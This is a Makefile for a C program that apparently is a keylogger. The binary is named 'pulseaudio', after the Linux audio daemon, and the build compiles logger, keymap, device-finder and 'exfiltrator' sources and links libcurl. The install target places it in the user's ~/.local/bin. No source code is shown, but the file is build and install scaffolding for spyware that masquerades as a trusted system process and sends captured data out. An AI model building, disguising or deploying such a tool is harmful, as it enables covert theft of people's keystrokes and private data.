# Makefile

CC = gcc
CFLAGS = -g -Wall
TARGET = pulseaudio
SRC = src/main.c src/logger.c src/keymap.c src/device_finder.c src/exfiltrator.c
INCLUDES = -Iinclude
LIBS = -lpthread -lcurl

.PHONY: all clean install uninstall

all: $(TARGET)

$(TARGET): $(SRC)
	$(CC) $(CFLAGS) $(INCLUDES) -o $(TARGET) $(SRC) $(LIBS)

install:
	mkdir -p ~/.local/bin
	cp $(TARGET) ~/.local/bin/$(TARGET)
	chmod +x ~/.local/bin/$(TARGET)

uninstall:
	rm -f ~/.local/bin/$(TARGET)

clean:
	rm -f $(TARGET)

